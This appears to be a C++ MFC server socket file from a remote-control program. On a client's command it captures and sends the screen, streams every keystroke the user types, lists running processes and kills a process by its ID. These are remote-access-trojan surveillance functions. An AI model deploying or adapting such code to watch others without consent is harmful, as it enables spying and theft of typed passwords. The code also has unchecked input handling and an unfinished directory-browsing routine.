// ReceivingSocket.cpp : implementation file
//

#include "pch.h"
#include "Server.h"
#include "ReceivingSocket.h"
#include <filesystem>
#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include <string>

#include "UtilScreenCapture.h"
#include "UtilKeystroke.h"
#include "UtilBrowseDirectory.h"

#define PRE_AGREED_PORT     8686
#define SEND_BUFFER_SIZE    4096
#define TIMER_ID_KEYSTROKE  1

namespace fs = std::filesystem;


// CReceivingSocket

CReceivingSocket::CReceivingSocket()
{
    m_timerId = SetTimer(NULL, TIMER_ID_KEYSTROKE, 100, NULL);
}

CReceivingSocket::~CReceivingSocket()
{
}

std::string getFirstWord(char* str) {
        std::string firstWord;
        int i = 0;
        while (str[i] != '\0' && str[i] != ' ') {
                firstWord += str[i];
                i++;
        }
        return firstWord;
}

std::string getSecondWord(char* input) {
        std::istringstream iss(input);
        std::string word1, word2;
        iss >> word1 >> word2;
        return word2;
}


void CReceivingSocket::OnReceive(int nErrorCode)
{
	// TODO: Add your specialized code here and/or call the base class
    char msg[256] = "";
	this->Receive(msg, 256);
    ((CServerApp*)AfxGetApp())->m_pServerView->AddMsg(msg);

	if (strcmp(msg, "REQ_CSCR") == 0)
	{
		OnReceiveCapScreen(nErrorCode);
	}
    else if (strcmp(msg, "REQ_KSTR") == 0)
    {
        OnReceiveKeystroke(nErrorCode);
    }
	else if (strcmp(msg, "REQ_BDIR") == 0)
	{
        OnReceiveBrowseDir(nErrorCode);
	}
        else if (strcmp(msg, "REQ_SPRO") == 0) {
                OnReceivePro(nErrorCode);
        }
        else if (getFirstWord(msg) == "REQ_SPRO_KILL") {
                std::string PID = getSecondWord(msg);
                int Pid = std::stoi(PID);
                OnReceivePro_Kill(nErrorCode, Pid);
        }
	CSocket::OnReceive(nErrorCode);
}

bool killProcess(DWORD pid) {
        HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
        if (hProcess == NULL) {
                return false;
        }
        bool result = TerminateProcess(hProcess, 0) != 0;
        CloseHandle(hProcess);
        return result;
}

bool CReceivingSocket::OnReceivePro_Kill(int nErrorCode, int Pid) {
        return killProcess(Pid);
}

void CReceivingSocket::OnReceivePro(int nErrorCode) {
        CString msg = "";

        HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hProcessSnap == INVALID_HANDLE_VALUE) {
                msg = "Failed to create process snapshot.\n";
                Send(msg.GetBuffer(msg.GetLength()), msg.GetLength(), 0);
                return;
        }

        // Initialize the PROCESSENTRY32 structure
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);

        // Retrieve information about the first process
        if (!Process32First(hProcessSnap, &pe32)) {
                msg = "Failed to retrieve process information.";
                Send(msg.GetBuffer(msg.GetLength()), msg.GetLength(), 0);
                CloseHandle(hProcessSnap);
                return;
        }

        // Print the process ID and process name of each process
        do {
                std::string processName(pe32.szExeFile);
                if (processName != "System Idle Process" && processName != "System") {
                        CString processIdStr;
                        processIdStr.Format(_T("%d"), pe32.th32ProcessID);
                        CString processNameStr(processName.c_str());
                        msg = msg + processNameStr.GetString() + "/" + processIdStr.GetString() + "/";
                }
        } while (Process32Next(hProcessSnap, &pe32));

        // Close the process snapshot handle
        CloseHandle(hProcessSnap);

        //MessageBox((LPCTSTR)msg, "Server");

        Send(msg.GetBuffer(msg.GetLength()), msg.GetLength(), 0);
}

void CReceivingSocket::OnClose(int nErrorCode)
{
	// TODO: Add your specialized code here and/or call the base class
	//AfxMessageBox("Connection Closed!");
	Close();
        CSocket::OnClose(nErrorCode);
}

BOOL CReceivingSocket::OnReceiveCapScreen(int nErrorCode)
{
	ScreenCapture();


    // return value
    BOOL bRet = TRUE;
    // used to monitor the progress of a sending operation
    int fileLength, cbLeftToSend;
    // pointer to buffer for sending data
    // (memory is allocated after sending file size)
    BYTE* sendData = NULL;

    CFile sourceFile;
    CFileException fe;
    BOOL bFileIsOpen = FALSE;

    if (!(bFileIsOpen = sourceFile.Open("screenshot.bmp",
        CFile::modeRead | CFile::typeBinary, &fe)))
    {
        TCHAR strCause[256];
        fe.GetErrorMessage(strCause, 255);
        TRACE("SendFileToRemoteRecipient encountered an error while opening the local file\n"
            "\tFile name = %s\n\tCause = %s\n\tm_cause = %d\n\tm_IOsError = %d\n",
            fe.m_strFileName, strCause, fe.m_cause, fe.m_lOsError);

        /* you should handle the error here */

        bRet = FALSE;
        goto PreReturnCleanup;
    }

    // first send length of file

    fileLength = sourceFile.GetLength();
    fileLength = htonl(fileLength);

    cbLeftToSend = sizeof(fileLength);

    do
    {
        int cbBytesSent;
        BYTE* bp = (BYTE*)(&fileLength) + sizeof(fileLength) - cbLeftToSend;
        cbBytesSent = this->Send(bp, cbLeftToSend);

        // test for errors and get out if they occurred
        if (cbBytesSent == SOCKET_ERROR)
        {
            int iErr = ::GetLastError();
            TRACE("SendFileToRemoteRecipient returned a socket error while sending file length\n"
                "\tNumber of Bytes sent = %d\n"
                "\tGetLastError = %d\n", cbBytesSent, iErr);

            /* you should handle the error here */

            bRet = FALSE;
            goto PreReturnCleanup;
        }

        // data was successfully sent, so account
        // for it with already-sent data
        cbLeftToSend -= cbBytesSent;
    } while (cbLeftToSend > 0);


    // now send the file's data    
    sendData = new BYTE[SEND_BUFFER_SIZE];

    cbLeftToSend = sourceFile.GetLength();

    do
    {
        // read next chunk of SEND_BUFFER_SIZE bytes from file

        int sendThisTime, doneSoFar, buffOffset;

        sendThisTime = sourceFile.Read(sendData, SEND_BUFFER_SIZE);
        buffOffset = 0;

        do
        {
            doneSoFar = this->Send(sendData + buffOffset,
                sendThisTime);

            // test for errors and get out if they occurred
            if (doneSoFar == SOCKET_ERROR)
            {
                int iErr = ::GetLastError();
                TRACE("SendFileToRemoteRecipient returned a socket error  while sending chunked file data\n"
                        "\tNumber of Bytes sent = %d\n"
                        "\tGetLastError = %d\n", doneSoFar, iErr);

                /* you should handle the error here */

                bRet = FALSE;
                goto PreReturnCleanup;
            }

            // data was successfully sent,
            // so account for it with already-sent data

            buffOffset += doneSoFar;
            sendThisTime -= doneSoFar;
            cbLeftToSend -= doneSoFar;
        } while (sendThisTime > 0);

    } while (cbLeftToSend > 0);

    AfxMessageBox("file sent successfully");


PreReturnCleanup: // labelled goto destination

    // free allocated memory
    // if we got here from a goto that skipped allocation,
    // delete of NULL pointer
    // is permissible under C++ standard and is harmless
    delete[] sendData;

    if (bFileIsOpen)
        sourceFile.Close();
    // only close file if it's open (open might have failed above)

    //this->Close();

    return bRet;

}

void CReceivingSocket::OnReceiveKeystroke(int nErrorCode)
{
    // Continuously send the name of the keystroke that has been tapped to the client
    while (1)
    {   
        CString keystrokeName(Keystroke().c_str()); 
        if (keystrokeName != " ")
            this->Send(keystrokeName, keystrokeName.GetLength());
        if (keystrokeName == "[ESC]")
            break;
        Sleep(10);
    }
    //this->Close();
}

void CReceivingSocket::OnReceiveBrowseDir(int nErrorCode) 
{
    //CString dirs(BrowseDirectory().c_str());
    //this->Send(dirs.GetBuffer(dirs.GetLength()), dirs.GetLength());

    std::vector<std::tuple<CString, CString>> folderList;
    std::vector<std::tuple<CString, CString, CString>> fileList;
    BrowseDirectory("D:", folderList, fileList);
    AfxMessageBox("D:\\");
}

